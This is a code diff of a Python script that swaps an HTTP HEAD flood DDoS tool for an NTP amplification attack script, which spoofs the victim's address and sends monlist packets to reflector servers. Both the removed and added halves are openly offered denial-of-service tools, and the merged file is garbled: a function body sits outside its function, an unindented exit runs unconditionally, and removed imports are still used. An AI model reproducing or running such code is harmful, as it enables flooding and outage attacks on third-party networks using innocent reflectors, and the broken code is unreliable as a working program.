@@ -1,15 +1,12 @@
 #!/usr/bin/env python3
-import os
-import logging
-import threading
-import random
-import socket
-import time
-import multiprocessing
-import time
-import fade
-import requests
+from scapy.all import *
 import sys
+import threading
+import time
+#NTP Amp DOS attack
+#usage ntpdos.py <target ip> <ntpserver list> <number of threads> ex: ntpdos.py 1.2.3.4 file.txt 10
+#FOR USE ON YOUR OWN NETWORK ONLY
+
 
 os.system("Clear")
 logo = """
@@ -32,55 +29,73 @@ print(faded_text)
 print("\033[32mWelcome to KF22-DDoS\033[0m")
 ip = input("\033[36mIP/Domain: \033[0m")
 port = int(input("\033[34mPort: \033[0m"))
+#packet sender
+def deny():
+    global ntplist
+    global currentserver
+    global data
+    global target
+ntpserver = ntplist[currentserver] #Get new server
+currentserver = currentserver + 1 #Increment for next
+packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=123)/Raw(load=data) #BUILD IT
+send(packet,loop=1) #SEND IT
 
-url = "http://" + str(ip)
+#So I dont have to have the same stuff twice
+def printhelp():
+    print("NTP Amplification DOS Attack")
+    print("By DaRkReD")
+    print("Usage ntpdos.py <target ip> <ntpserver list> <number of threads>")
+    print("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
+    print("NTP serverlist file should contain one IP per line")
+    print("MAKE SURE YOUR THREAD COUNT IS LESS THAN OR EQUAL TO YOUR NUMBER OF SERVERS")
+    exit(0)
 
-def randomip():
-  randip = []
-  randip1 = random.randint(1,255)
-  randip2 = random.randint(1,255)
-  randip3 = random.randint(1,255)
-  randip4 = random.randint(1,255)
-  
-  randip.append(randip1)
-  randip.append(randip2)
-  randip.append(randip3)
-  randip.append(randip4)
+if len(sys.argv) < 4:
+    printhelp()
+#Fetch Args
+target = sys.argv[1]
 
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
-  return(randip)
+#Help out idiots
+if target in ("help","-h","h","?","--h","--help","/?"):
+    printhelp()
 
-print("\033[33m[Starting the attack]\033[0m")
+ntpserverfile = sys.argv[2]
+numberthreads = int(sys.argv[3])
+#System for accepting bulk input
+ntplist = []
+currentserver = 0
+with open(ntpserverfile) as f:
+    ntplist = f.readlines()
 
-time.sleep(1)
-
-
-def attack():
-  connection = "Connection: null\r\n"
-  referer = "Referer: null\r\n"
-  forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
-  request = get_host + referer  + connection + forward + "\r\n\r\n"
-  while True:
-    try:
-      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      atk.connect((ip, port))
-      print("\033[32mKF22  \033[91m" +str(u)+ "  \033[93m[\033[34mAttack Sent\033[93m]  \033[36m" +ip+ "  \033[96mFinish\033[0m")
-      print("\033[32mKF22  \033[91m" +str(u)+ "  \033[93m[\033[34mAttack Sent\033[93m]  \033[36m" +ip+ "  \033[96mFinish\033[0m")
-      for y in range(100):
-          atk.send(str.encode(request))
-    except socket.error:
-      time.sleep(.1)
-    except:
-      pass
+    
 
 
-def send2attack():
-  for i in range(5000): #Magic Power
-    mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
-    mp.start() #Magic Starts
 
-send2attack() #61 lines for the most powerful attack, cool?
+#Make sure we dont out of bounds
+if numberthreads > int(len(ntplist)):
+    print("Attack Aborted: More threads than servers")
+    print("Next time dont create more threads than servers")
+exit(0)
 
-             
+#Magic Packet aka NTP v2 Monlist Packet
+data = "\x17\x00\x03\x2a" + "\x00" * 4
+
+#Hold our threads
+threads = []
+print("Starting to flood: "+ target + " using NTP list: " + ntpserverfile + " With " + str(numberthreads) + " threads")
+print("Use CTRL+C to stop attack")
+
+#Thread spawner
+for n in range(numberthreads):
+    thread = threading.Thread(target=deny)
+    thread.daemon = True
+    thread.start()
+
+    threads.append(thread)
+
+#In progress!
+print("Sending...")
+
+#Keep alive so ctrl+c still kills all them threads
+while True:
+    time.sleep(1)
